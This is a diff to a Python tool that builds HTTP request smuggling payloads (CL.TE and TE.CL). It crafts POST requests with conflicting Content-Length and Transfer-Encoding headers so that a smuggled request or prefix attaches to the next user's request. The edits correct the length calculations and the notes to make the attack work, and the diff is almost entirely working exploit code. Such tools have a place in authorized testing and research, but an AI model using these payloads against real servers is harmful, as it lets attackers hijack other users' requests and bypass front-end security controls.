@@ -21,21 +21,22 @@ def clte(host, path):
     # back-end; trailing bytes (a smuggled request line) prefix the NEXT request.
     prefix = f"GET {path} HTTP/1.1{CRLF}X-Ignore: "
     body = f"0{CRLF}{CRLF}{prefix}"
-    cl = len(f"0{CRLF}{CRLF}") + 1   # front-end forwards "0\r\n\r\n" + first byte(s) of the prefix
+    cl = len(body)                   # front-end forwards the WHOLE body ("0\r\n\r\n" + your full GET prefix)
     req = (f"POST / HTTP/1.1{CRLF}"
            f"Host: {host}{CRLF}"
            f"Content-Length: {cl}{CRLF}"
            f"Transfer-Encoding: chunked{CRLF}"
            f"{CRLF}"
            f"{body}")
-    note = ("CL.TE: front-end uses Content-Length=%d (forwards '0\\r\\n\\r\\n' + leftover); back-end uses chunked "
-            "and stops at '0', leaving the rest to prefix the next request. Tune CL so exactly your prefix leaks." % cl)
+    note = ("CL.TE: front-end uses Content-Length=%d (forwards the whole body); back-end uses chunked and stops at "
+            "'0', leaving your GET prefix to attach to the NEXT request on the connection. Lower CL only if you want "
+            "to leak fewer bytes." % cl)
     return req, note
 
 def tecl(host, smuggled):
     # front-end: chunked ; back-end: Content-Length. Embed a full smuggled request as one chunk; size it in hex.
     smuggled = smuggled.replace("\\r\\n", CRLF)
-    chunk_data = "G" + smuggled            # leading char that the back-end appends to a victim request
+    chunk_data = smuggled                  # the full smuggled request the back-end parses as the NEXT request
     size_hex = format(len(chunk_data), "x")
     body = f"{size_hex}{CRLF}{chunk_data}{CRLF}0{CRLF}{CRLF}"
     # back-end Content-Length should cover only up to the first chunk-size line so it treats the rest as a new request
